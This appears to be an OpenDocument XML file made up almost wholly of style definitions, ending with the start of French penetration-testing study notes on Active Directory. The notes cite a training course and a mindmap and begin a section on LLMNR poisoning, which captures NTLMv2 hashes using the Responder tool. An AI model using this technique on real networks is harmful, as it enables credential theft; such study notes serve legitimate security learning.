    </style:style>
    <style:style style:name="P151" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00e92701" officeooo:paragraph-rsid="00e92701" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P152" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00f6ce99" officeooo:paragraph-rsid="00f6ce99" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P153" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="01148eeb" officeooo:paragraph-rsid="01148eeb" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P154" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="01176dff" officeooo:paragraph-rsid="01176dff" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P155" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="007fb6e3" officeooo:paragraph-rsid="007fb6e3" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P156" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="0083c77d" officeooo:paragraph-rsid="0083c77d" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P157" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="0097f6a8" officeooo:paragraph-rsid="0097f6a8" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P158" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="009a2ab9" officeooo:paragraph-rsid="009a2ab9" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P159" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="009b2748" officeooo:paragraph-rsid="009b2748" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P160" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="009c2ae8" officeooo:paragraph-rsid="009c2ae8" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P161" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="009d3860" officeooo:paragraph-rsid="009d3860" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P162" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="010556d9" officeooo:paragraph-rsid="010556d9" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P163" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="00a966cf" officeooo:paragraph-rsid="00a966cf" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P164" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="00a7078b" officeooo:paragraph-rsid="00a966cf" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P165" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="00a7078b" officeooo:paragraph-rsid="00af8ac3" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P166" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="00b7477e" officeooo:paragraph-rsid="00b7477e" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P167" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="00b7477e" officeooo:paragraph-rsid="00bc1bf0" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P168" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="00b7477e" officeooo:paragraph-rsid="00bff1c4" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P169" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="00be32a1" officeooo:paragraph-rsid="00be32a1" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P170" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="00c372d5" officeooo:paragraph-rsid="00c3a439" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P171" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="00ebebf0" officeooo:paragraph-rsid="00ebebf0" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P172" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="00f422fd" officeooo:paragraph-rsid="00f422fd" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P173" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="011ce380" officeooo:paragraph-rsid="011ce380" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P174" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="0120922d" officeooo:paragraph-rsid="0120922d" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P175" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="0123f0a4" officeooo:paragraph-rsid="0123f0a4" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P176" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="012ae8cf" officeooo:paragraph-rsid="012ae8cf" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P177" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="012cbaad" officeooo:paragraph-rsid="012cbaad" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P178" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="0130aec7" officeooo:paragraph-rsid="0130aec7" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P179" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="0132890a" officeooo:paragraph-rsid="0132890a" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P180" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="0137941e" officeooo:paragraph-rsid="0137941e" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P181" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="01399635" officeooo:paragraph-rsid="01399635" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P182" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" style:text-underline-style="solid" style:text-underline-type="double" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="01399635" officeooo:paragraph-rsid="01399635" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P183" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="010ca970" officeooo:paragraph-rsid="010ca970" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P184" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="00095778" officeooo:paragraph-rsid="00095778" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P185" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="0116de14" officeooo:paragraph-rsid="0116de14" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P186" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00cd9b82"/>
    </style:style>
    <style:style style:name="P187" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L2"/>
    <style:style style:name="P188" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00fc7a1a" officeooo:paragraph-rsid="00fc7a1a" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="000bcde0"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="000f3273"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="00183642"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="0019b37b"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties officeooo:rsid="0019e89d"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="00183642" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="0019b37b" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="002a4b8f" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="002b7fdf" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="003548ef" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="004095cc" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="0042ab28" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="00621141" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="008189bf" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="008654be" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="008851ba" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="008b81dc" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="0088c46d" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="00902fe1" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="00945193" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="00b09360" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties officeooo:rsid="001e86e7"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties officeooo:rsid="00224a9b"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties officeooo:rsid="0023f265"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties officeooo:rsid="002f6323"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties fo:font-size="14pt" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties fo:font-size="14pt" officeooo:rsid="004beb81" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="T29" style:family="text">
      <style:text-properties fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T30" style:family="text">
      <style:text-properties fo:font-style="normal" officeooo:rsid="003548ef" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T31" style:family="text">
      <style:text-properties fo:font-style="normal" officeooo:rsid="011df2b1" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T32" style:family="text">
      <style:text-properties fo:font-style="normal" officeooo:rsid="011fda0d" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T33" style:family="text">
      <style:text-properties fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00bc1bf0" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T34" style:family="text">
      <style:text-properties fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00bff1c4" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T35" style:family="text">
      <style:text-properties officeooo:rsid="0039f910"/>
    </style:style>
    <style:style style:name="T36" style:family="text">
      <style:text-properties officeooo:rsid="003b0955"/>
    </style:style>
    <style:style style:name="T37" style:family="text">
      <style:text-properties officeooo:rsid="003fc9c2"/>
    </style:style>
    <style:style style:name="T38" style:family="text">
      <style:text-properties style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color"/>
    </style:style>
    <style:style style:name="T39" style:family="text">
      <style:text-properties officeooo:rsid="0042ab28"/>
    </style:style>
    <style:style style:name="T40" style:family="text">
      <style:text-properties officeooo:rsid="00483c05"/>
    </style:style>
    <style:style style:name="T41" style:family="text">
      <style:text-properties officeooo:rsid="00559491"/>
    </style:style>
    <style:style style:name="T42" style:family="text">
      <style:text-properties officeooo:rsid="005f8bfd"/>
    </style:style>
    <style:style style:name="T43" style:family="text">
      <style:text-properties officeooo:rsid="00621141"/>
    </style:style>
    <style:style style:name="T44" style:family="text">
      <style:text-properties officeooo:rsid="00668ad0"/>
    </style:style>
    <style:style style:name="T45" style:family="text">
      <style:text-properties officeooo:rsid="006891a3"/>
    </style:style>
    <style:style style:name="T46" style:family="text">
      <style:text-properties officeooo:rsid="006a589f"/>
    </style:style>
    <style:style style:name="T47" style:family="text">
      <style:text-properties officeooo:rsid="006cae5d"/>
    </style:style>
    <style:style style:name="T48" style:family="text">
      <style:text-properties officeooo:rsid="006d365d"/>
    </style:style>
    <style:style style:name="T49" style:family="text">
      <style:text-properties officeooo:rsid="007ceb02"/>
    </style:style>
    <style:style style:name="T50" style:family="text">
      <style:text-properties officeooo:rsid="008851ba"/>
    </style:style>
    <style:style style:name="T51" style:family="text">
      <style:text-properties officeooo:rsid="0088c46d"/>
    </style:style>
    <style:style style:name="T52" style:family="text">
      <style:text-properties style:text-line-through-style="none" style:text-line-through-type="none"/>
    </style:style>
    <style:style style:name="T53" style:family="text">
      <style:text-properties style:text-line-through-style="none" style:text-line-through-type="none" officeooo:rsid="008ef158"/>
    </style:style>
    <style:style style:name="T54" style:family="text">
      <style:text-properties style:text-line-through-style="none" style:text-line-through-type="none" officeooo:rsid="008f291d"/>
    </style:style>
    <style:style style:name="T55" style:family="text">
      <style:text-properties style:text-line-through-style="none" style:text-line-through-type="none" fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T56" style:family="text">
      <style:text-properties style:text-line-through-style="none" style:text-line-through-type="none" fo:font-style="italic" officeooo:rsid="008f291d" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T57" style:family="text">
      <style:text-properties style:text-line-through-style="none" style:text-line-through-type="none" fo:font-style="italic" officeooo:rsid="008ef158" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T58" style:family="text">
      <style:text-properties officeooo:rsid="008b81dc"/>
    </style:style>
    <style:style style:name="T59" style:family="text">
      <style:text-properties officeooo:rsid="008d2d3c"/>
    </style:style>
    <style:style style:name="T60" style:family="text">
      <style:text-properties style:text-line-through-style="solid" style:text-line-through-type="single" officeooo:rsid="008ef158"/>
    </style:style>
    <style:style style:name="T61" style:family="text">
      <style:text-properties style:text-line-through-style="solid" style:text-line-through-type="single" fo:font-style="italic" officeooo:rsid="008ef158" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T62" style:family="text">
      <style:text-properties officeooo:rsid="009bbf4d"/>
    </style:style>
    <style:style style:name="T63" style:family="text">
      <style:text-properties officeooo:rsid="00a966cf"/>
    </style:style>
    <style:style style:name="T64" style:family="text">
      <style:text-properties officeooo:rsid="00aab4ea"/>
    </style:style>
    <style:style style:name="T65" style:family="text">
      <style:text-properties officeooo:rsid="00af8ac3"/>
    </style:style>
    <style:style style:name="T66" style:family="text">
      <style:text-properties officeooo:rsid="00b278c2"/>
    </style:style>
    <style:style style:name="T67" style:family="text">
      <style:text-properties officeooo:rsid="00b576a1"/>
    </style:style>
    <style:style style:name="T68" style:family="text">
      <style:text-properties officeooo:rsid="00b7bf1a"/>
    </style:style>
    <style:style style:name="T69" style:family="text">
      <style:text-properties officeooo:rsid="00ba6877"/>
    </style:style>
    <style:style style:name="T70" style:family="text">
      <style:text-properties officeooo:rsid="00bacfc5"/>
    </style:style>
    <style:style style:name="T71" style:family="text">
      <style:text-properties officeooo:rsid="00be4e4e"/>
    </style:style>
    <style:style style:name="T72" style:family="text">
      <style:text-properties officeooo:rsid="00c5183b"/>
    </style:style>
    <style:style style:name="T73" style:family="text">
      <style:text-properties officeooo:rsid="00c79370"/>
    </style:style>
    <style:style style:name="T7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cd9b82"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e06ccf" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T77" style:family="text">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="00cd9b82" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T78" style:family="text">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="00ced674" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T79" style:family="text">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="00d07572" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T80" style:family="text">
      <style:text-properties fo:font-size="12pt" fo:font-weight="normal" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T81" style:family="text">
      <style:text-properties fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="00d83d8e" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T82" style:family="text">
      <style:text-properties fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="00dcfc6a" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T83" style:family="text">
      <style:text-properties fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="00e06ccf" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T84" style:family="text">
      <style:text-properties fo:font-size="12pt" style:font-size-asian="10.5pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T85" style:family="text">
      <style:text-properties fo:font-size="12pt" officeooo:rsid="00d56f80" style:font-size-asian="10.5pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T86" style:family="text">
      <style:text-properties fo:font-size="12pt" officeooo:rsid="00d6e12c" style:font-size-asian="10.5pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T87" style:family="text">
      <style:text-properties officeooo:rsid="00c90d84"/>
    </style:style>
    <style:style style:name="T88" style:family="text">
      <style:text-properties officeooo:rsid="00ca3411"/>
    </style:style>
    <style:style style:name="T89" style:family="text">
      <style:text-properties officeooo:rsid="00cca9d8"/>
    </style:style>
    <style:style style:name="T90" style:family="text">
      <style:text-properties officeooo:rsid="00e7d4d3"/>
    </style:style>
    <style:style style:name="T91" style:family="text">
      <style:text-properties officeooo:rsid="00e87574"/>
    </style:style>
    <style:style style:name="T92" style:family="text">
      <style:text-properties officeooo:rsid="00ed47ed"/>
    </style:style>
    <style:style style:name="T93" style:family="text">
      <style:text-properties officeooo:rsid="00f06945"/>
    </style:style>
    <style:style style:name="T94" style:family="text">
      <style:text-properties officeooo:rsid="00ff6fd5"/>
    </style:style>
    <style:style style:name="T95" style:family="text">
      <style:text-properties officeooo:rsid="0100c846"/>
    </style:style>
    <style:style style:name="T96" style:family="text">
      <style:text-properties officeooo:rsid="01063f8e"/>
    </style:style>
    <style:style style:name="T97" style:family="text">
      <style:text-properties officeooo:rsid="0112d488"/>
    </style:style>
    <style:style style:name="T98" style:family="text">
      <style:text-properties officeooo:rsid="012f7f39"/>
    </style:style>
    <style:style style:name="T99" style:family="text">
      <style:text-properties officeooo:rsid="01338854"/>
    </style:style>
    <style:style style:name="T100" style:family="text">
      <style:text-properties officeooo:rsid="01354a37"/>
    </style:style>
    <style:style style:name="T101" style:family="text">
      <style:text-properties officeooo:rsid="0137431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Ces notes sont principalement issues du cours de Heath Adams : https://www.youtube.com/watch?v=VXxH4n684HE </text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8">Mindmap Par OCD</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P183">https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg</text:p>
      <text:p text:style-name="P184"/>
      <text:p text:style-name="P7">INITIAL VECTOR</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2"><text:span text:style-name="T27">1. LLMNR Poisoning</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P36">1.1 <text:span text:style-name="T1">LLMNR c’est q</text:span>uoi ?</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">- <text:span text:style-name="T1">Permet d’identifier des hôtes quand le DNS n’y arrive pas.</text:span></text:p>
      <text:p text:style-name="P11">- <text:span text:style-name="T1">Auparavant NBT-NS</text:span></text:p>
      <text:p text:style-name="P11">- <text:span text:style-name="T1">Problème : les services utilisent un username et un hash NTLMv2 </text:span><text:span text:style-name="T2">quand ils nous répondent.</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P4">1.2 Comment faire ?</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12">- Responder</text:p>
      <text:p text:style-name="P11"/>
